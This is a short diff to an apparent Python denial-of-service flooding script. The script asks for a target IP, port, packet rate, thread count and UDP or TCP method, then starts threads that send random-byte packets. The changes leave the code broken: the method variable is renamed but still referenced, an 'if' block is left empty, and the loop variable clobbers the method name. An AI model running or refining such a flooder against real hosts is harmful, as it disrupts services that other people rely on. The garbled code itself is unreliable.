@@ -142,7 +142,10 @@ ip = socket.gethostbyname(ip)
 port = int(input("[ ? ] PORT >>= "))
 pack = int(input("[ ? ] PACKET/S >>= "))
 th = int(input("[ ? ] THREAD/T >>= "))
-method = str(input("[ ? ] METHOD >>= "))
+kntl = str(input("[ ? ] METHOD >>= "))
+
+if method == "UDP" or method == "TCP":
+  
 def start():
   global useragents, socks3
   hh = random._urandom(5000)
@@ -190,10 +193,10 @@ def start():
              print('[+] server error')
              
     for kntl in range(th):
-      if method == "UDP":
+      if kntl == "UDP":
        thread = threading.Thread(target=start)
        thread.start()
-      else:
-       for kntl in range(76000):
+       
+      elif kntl == "TCP":
         thread2  = threading.Thread(target=tcp)
         thread2.start()
